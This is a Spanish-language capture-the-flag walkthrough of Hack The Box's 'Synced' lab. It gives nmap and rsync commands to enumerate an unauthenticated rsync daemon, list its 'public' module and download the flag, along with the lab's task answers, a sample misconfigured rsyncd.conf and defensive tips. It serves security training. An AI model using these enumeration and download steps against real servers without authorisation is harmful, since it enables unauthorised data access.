# Hack The Box — Starting Point 8: Synced

Notas sobre **Rsync** como **daemon** en el puerto **873/tcp**, enumeración de **módulos** (recursos compartidos) sin autenticación y descarga de archivos directamente con el cliente `rsync`.

---

## Contexto

**Synced** introduce **Rsync** funcionando como **servidor (daemon)**. Habitualmente `rsync` se usa sobre SSH para sincronizar archivos entre máquinas, pero también puede correr como servicio independiente escuchando en **873/tcp**, exponiendo “módulos” (similares a *shares* de SMB).

Si el daemon está mal configurado, esos módulos son legibles sin credenciales: cualquiera puede listar y descargar archivos, incluida la flag.

---

## Conceptos del módulo (respuestas a las tareas)

### Tarea 1 — ¿Cuál es el puerto por defecto de rsync?

**873/tcp**.

### Tarea 2 — ¿Qué flag de Nmap se utiliza para realizar un escaneo de versión?

**`-sV`**.

### Tarea 3 — ¿Qué número de versión de rsync se descubre en el escaneo Nmap?

En el laboratorio canónico suele aparecer **rsync (protocol version 31)**, correspondiente a **rsync 3.1.x / 3.2.x**. La cifra exacta depende de cuándo lo despliegue HTB; la pregunta apunta al **número de versión de protocolo** que reporta `nmap` o el propio handshake.

### Tarea 4 — ¿Cuál es el nombre del módulo de rsync que está disponible en el sistema objetivo?

**`public`**. Es el típico nombre de módulo abierto en los labs. La respuesta exacta la confirmas listando módulos como se ve abajo.

### Tarea 5 — ¿Qué comando se utiliza para listar el contenido de un módulo de rsync?

```bash
rsync --list-only rsync://TARGET_IP/public/
```

o la sintaxis equivalente con doble dos puntos:

```bash
rsync TARGET_IP::public/
```

Ambas listan el contenido de un módulo sin descargar nada.

### Tarea 6 — ¿Qué flag se utiliza para descargar un archivo de un servidor rsync?

No hay un flag exclusivo: basta con **especificar origen y destino**, igual que en `cp`:

```bash
rsync rsync://TARGET_IP/public/flag.txt .
```

Las flags habituales son **`-a`** (modo archivo: preserva permisos/tiempos) y **`-v`** (verbose). En el room la respuesta esperada suele ser **`-a`** (o `-av`).

## Metodología

### 1. Conectividad

```bash
ping -c 2 TARGET_IP
```

### 2. Nmap

```bash
nmap -sV -p- --min-rate=1000 TARGET_IP
```

Buscar: `873/tcp open rsync`.

**Solo el puerto:**

```bash
nmap -p 873 -sV TARGET_IP
```

**Con scripts NSE útiles:**

```bash
nmap -p 873 --script rsync-list-modules TARGET_IP
```

- `rsync-list-modules`: pide al daemon la lista de módulos disponibles (equivalente a `rsync IP::`).

## Herramienta principal: `rsync`

### Sintaxis general del cliente

```bash
rsync [opciones] ORIGEN DESTINO
```

Origen/destino pueden ser:

| Notación | Significado |
|----------|-------------|
| `path/local` | Ruta local |
| `usuario@host:/ruta` | Remoto vía SSH |
| `rsync://host[:puerto]/modulo/ruta` | Remoto vía rsync **daemon** (URL) |
| `host::modulo/ruta` | Equivalente al anterior (doble `::`) |

### Listar módulos del daemon (sin elegir uno)

```bash
rsync --list-only rsync://TARGET_IP/
```

o

```bash
rsync TARGET_IP::
```

Salida típica:

```text
public          Public Files
```

- A la izquierda: **nombre del módulo**.
- A la derecha: **comentario** definido en `rsyncd.conf`.

### Listar contenido de un módulo

```bash
rsync --list-only rsync://TARGET_IP/public/
# o
rsync TARGET_IP::public/
```

Verás los archivos como si fuera `ls -l`.

### Descargar un archivo concreto

```bash
rsync -av rsync://TARGET_IP/public/flag.txt .
```

| Flag | Función |
|------|---------|
| `-a` | **Archive**: preserva permisos, tiempos, enlaces simbólicos (= `-rlptgoD`) |
| `-v` | Verbose: muestra qué archivos se transfieren |
| `-z` | Comprime durante la transferencia |
| `-P` | `--progress` + `--partial` (barra de progreso y reanudación) |
| `-r` | Recursivo en directorios (incluido en `-a`) |
| `-n` | **Dry run**: simula sin escribir nada |
| `--delete` | Borra en destino lo que no exista en origen (¡peligroso!) |
| `--port=N` | Puerto alternativo si no es 873 |
| `--password-file=ruta` | Contraseña para módulos con auth (no en Synced) |

### Descargar todo el módulo

```bash
rsync -av rsync://TARGET_IP/public/ ./public/
```

Crea `./public/` y vuelca todo el contenido del módulo.

### Leer la flag

Después de la descarga:

```bash
cat flag.txt
```

## Notas de configuración (lado servidor)

Un `rsyncd.conf` típico vulnerable se parece a:

```ini
[public]
    path = /opt/public
    comment = Public Files
    read only = yes
    list = yes
    uid = nobody
    gid = nogroup
    auth users =          # vacío → sin autenticación
```

Vectores comunes en pentests reales:

- Módulos con `read only = no` → **escritura no autenticada** (subir archivos, posible RCE si llegan a directorios web/cron).
- Información sensible en módulos “de respaldo” mal protegidos.
- Credenciales en `secrets file` con permisos laxos.

### Defensa

- Definir `auth users` y `secrets file` (`chmod 600`).
- `hosts allow = <ip de gestión>` y `hosts deny = *`.
- Preferir `rsync` **sobre SSH** (no daemon) cuando sea posible.
- Firewall delante del 873.

## Resumen de comandos

| Comando | Propósito |
|---------|-----------|
| `nmap -sV -p 873 TARGET_IP` | Confirmar rsync y versión |
| `nmap -p 873 --script rsync-list-modules TARGET_IP` | Listar módulos sin abrir cliente |
| `rsync TARGET_IP::` | Listar módulos vía cliente |
| `rsync --list-only rsync://IP/public/` | Listar contenido del módulo |
| `rsync -av rsync://IP/public/flag.txt .` | Descargar la flag |
| `rsync -av rsync://IP/public/ ./public/` | Mirror completo del módulo |
| `cat flag.txt` | Leer la flag descargada |

## Checklist

1. VPN HTB activa
2. `nmap -sV -p-` → **873/tcp rsync**
3. `rsync TARGET_IP::` → identificar módulo `public`
4. `rsync --list-only rsync://TARGET_IP/public/` → ver `flag.txt`
5. `rsync -av rsync://TARGET_IP/public/flag.txt .`
6. `cat flag.txt` → enviar la flag
